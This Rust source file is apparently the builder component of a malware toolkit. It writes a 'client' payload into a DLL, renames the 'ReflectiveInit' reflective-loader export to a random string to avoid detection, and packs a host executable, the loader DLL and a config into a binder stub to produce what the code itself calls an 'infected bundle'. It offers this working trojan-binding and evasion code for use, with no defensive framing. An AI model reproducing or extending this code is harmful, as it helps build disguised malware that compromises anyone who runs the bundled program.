use std::fs;
use std::path::Path;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;

pub fn embed_client_in_dll(dll_path: &Path, client_path: &Path) -> Result<(), String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;
    let client_bytes = fs::read(client_path).map_err(|e| e.to_string())?;

    patch_section(&mut dll_bytes, b"PAYLOAD_MARKER_PLACEHOLDER", &client_bytes)?;

    fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

pub fn randomize_dll_exports(dll_path: &Path) -> Result<String, String> {
    let mut dll_bytes = fs::read(dll_path).map_err(|e| e.to_string())?;

    let random_name: String = thread_rng()
        .sample_iter(&Alphanumeric)
        .take(12)
        .map(char::from)
        .collect();

    // Primitive search for "ReflectiveInit" and replace it
    let target = b"ReflectiveInit\0";
    if let Some(pos) = dll_bytes.windows(target.len()).position(|window| window == target) {
        let name_bytes = random_name.as_bytes();
        for i in 0..name_bytes.len() {
            dll_bytes[pos + i] = name_bytes[i];
        }
        dll_bytes[pos + name_bytes.len()] = 0; // Null terminator

        fs::write(dll_path, dll_bytes).map_err(|e| e.to_string())?;
        Ok(random_name)
    } else {
        // Not found is not necessarily an error if it was already randomized or doesn't exist
        Ok("Default".to_string())
    }
}

pub fn create_infected_bundle(
    binder_stub_path: &Path,
    host_exe_path: &Path,
    loader_dll_path: &Path,
    dll_name: &str,
    output_path: &Path
) -> Result<(), String> {
    let mut binder_bytes = fs::read(binder_stub_path).map_err(|e| e.to_string())?;
    let host_bytes = fs::read(host_exe_path).map_err(|e| e.to_string())?;
    let dll_bytes = fs::read(loader_dll_path).map_err(|e| e.to_string())?;

    // Find and patch sections in binder stub
    // .host (2MB)
    // .dll (1MB)
    // .config (1KB)

    patch_section(&mut binder_bytes, b"HOST_MARKER_PLACEHOLDER", &host_bytes)?;
    patch_section(&mut binder_bytes, b"DLL_MARKER_PLACEHOLDER", &dll_bytes)?;
    patch_section(&mut binder_bytes, b"CONF_MARKER_PLACEHOLDER", dll_name.as_bytes())?;

    fs::write(output_path, binder_bytes).map_err(|e| e.to_string())?;
    Ok(())
}

fn patch_section(bytes: &mut [u8], marker: &[u8], data: &[u8]) -> Result<(), String> {
    // In the stub we should actually use markers if we are doing primitive patching
    // or use a proper PE editor to find the named sections.
    // For this implementation, I'll assume the stub has unique markers.
    if let Some(pos) = bytes.windows(marker.len()).position(|window| window == marker) {
        if pos + data.len() > bytes.len() {
             return Err("Target section too small for data".to_string());
        }
        for (i, &b) in data.iter().enumerate() {
            bytes[pos + i] = b;
        }
        Ok(())
    } else {
        Err(format!("Marker {:?} not found", std::str::from_utf8(marker).unwrap_or("???")))
    }
}
